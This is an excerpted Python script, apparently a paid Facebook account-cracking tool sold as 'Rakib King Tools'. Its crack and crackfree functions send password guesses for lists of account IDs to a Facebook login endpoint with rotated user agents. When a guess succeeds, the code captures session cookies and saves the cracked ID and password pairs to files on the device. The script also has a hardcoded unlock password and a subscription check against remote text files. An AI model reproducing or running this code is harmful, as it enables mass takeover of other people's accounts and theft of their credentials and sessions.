...
def main():
    stored_password = "rakibxd"  # Replace with your stored password
    ...
    while True:
        ...
        if is_password_valid(user_password, stored_password):
            ...
            print("Welcome to Rakib KING TOOLS!")
            os.system('espeak -a 300 "Welcome to Rakib King Tools varson 2.7 ..."')
            time.sleep(2)
            os.system('clear')
...
princp=[]
try:
    prox= requests.get('https://raw.githubusercontent.com/dxRakib-99/F88/main/approved.txt').text
...
def uaku():
    try:
        ...
        a=requests.get('https://raw.githubusercontent.com/dxrakib720/FGJA/main/GFUD-txt').text
...
╠══[Facebook                 • RAKIB KING]    ║  \033[1;97m  
╠══[Github                   • \33[1;38mRAKIB-KING ]   ║\33[1;34m   
╠══[Whatsapp                 • 01603238653 ]  ║\33[1;35m 
╠══[TOOLS                    • PAID ]         ║ \33[1;32m   
...
def Subscraption():
    ...
    os.system('clear')
    print(logo)
    r1 = requests.get("https://raw.githubusercontent.com/dxrakib720/MN-RAKIB/main/F55.txt").text
    if id in r1:
        os.system('clear')
        print(logo)
    else:
        ...
        print("\033[1;39m[\033[1;32m●\033[1;39m]\033[1;33m Rakib TooLs Daily Update)✅ \033[0;92m")
        ...
        tks = f'https://wa.me/+8801603238653?text={message}'
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[Rakib•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    #sys.stdout.write(f"\r\033[100;92m{bo}[Rakib•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [OK{bo}•{H}{ok}{P}] [{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;97m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;97m[\033[0;93mRakib-Cp] {idf} \033[0;97m• \033[0;93m{pw}')
                ...
                print(f'\r\033[0;92mRakib-Ok] {idf} \033[0;97m• \033[0;92m{pw}\n\033[0 ;[🌺]= COOKIES • \x1b[38;5;208m{kuki}\033[0;97m\n')
                #cek_apk(session,coki)
                #print(f'\r\033[0;92m[Rakib\033[0;97m•\033[0;92mOk💚] {idf} \033[0;97m• \033[0;92m{pw}\n\033[0;93m[🌺]= COOKIES • \033[100;92m{kuki}\033[0;97m\n')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[Rakib-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;93m[{time.strftime("%H:%M")}\033[0;97m•\033[0;93mRakib-Cp] {idf} \033[0;97m• \033[0;93m{pw}')
                os.system('espeak -a 300 " Cp,"')
                open('/sdcard/Rakib-CP.txt', 'a').write( cid+' | '+ps+' \n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[0;92m[{time.strftime("%H:%M")}\033[0;97m•\033[0;92mRakib-Ok] {idf} \033[0;97m• \033[0;92m{pw} ')
                #cek_apk(session,coki)
                os.system('espeak -a 300 " Rakib,  Ok,  id"')
                open('/sdcard/Rakib-OK.txt', 'a').write( cid+' | '+ps+' \n')
                break
